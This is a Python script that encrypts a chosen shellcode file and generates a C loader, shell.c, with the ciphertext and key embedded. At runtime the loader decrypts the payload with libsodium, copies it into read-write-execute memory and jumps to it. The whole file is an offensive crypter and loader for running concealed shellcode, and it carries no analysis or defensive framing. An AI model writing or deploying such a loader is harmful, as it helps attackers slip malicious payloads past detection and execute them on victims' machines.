import cryptonite

def encrypt_shellcode():
    key = cryptonite.generate_key()
    shellcode_file = input("Filename: ")
    encrypted_data = cryptonite.encrypt_file(shellcode_file, key)
    data_c_array = cryptonite.bytes_to_c_array(encrypted_data)
    key_c_array = cryptonite.bytes_to_c_array(key)

    c_template = create_c_template(data_c_array, key_c_array)
    
    cryptonite.write_to_file("shell.c", c_template, "w")
    print("C code has been written to shell.c")

def create_c_template(encrypted_data_array, key_array):
    """Generate the C template code with the encrypted data and key."""
    template = f"""
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sodium.h>
#include <sys/mman.h>

int main() {{
    // Initialize libsodium
    if (sodium_init() < 0) {{
        return 1; // Panic
    }}

    // Define the encrypted data (including nonce and ciphertext)
    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
    unsigned int encrypted_data_len = sizeof(encrypted_data);

    // Key
    unsigned char key_bytes[] = {{ {key_array} }};

    // Extract nonce from the encrypted data (first 24 bytes)
    unsigned char nonce[crypto_secretbox_NONCEBYTES];
    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);

    // Prepare to decrypt
    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES]; // MAC size to subtract
    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
        // Decryption failed
        printf("Decryption failed!\\n");
        return 1;
    }}

    // Allocate executable memory
    void *exec_mem = mmap(NULL, sizeof(decrypted), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}

    // Copy decrypted shellcode to executable memory
    memcpy(exec_mem, decrypted, sizeof(decrypted));

    // Execute shellcode
    void (*shellcode)() = exec_mem; // Cast the memory to a function pointer
    shellcode(); // Execute the shellcode

    // Clean up
    munmap(exec_mem, sizeof(decrypted));
    
    return 0;
}}

"""
    return template

def main():
    encrypt_shellcode()

if __name__ == "__main__":
    main()
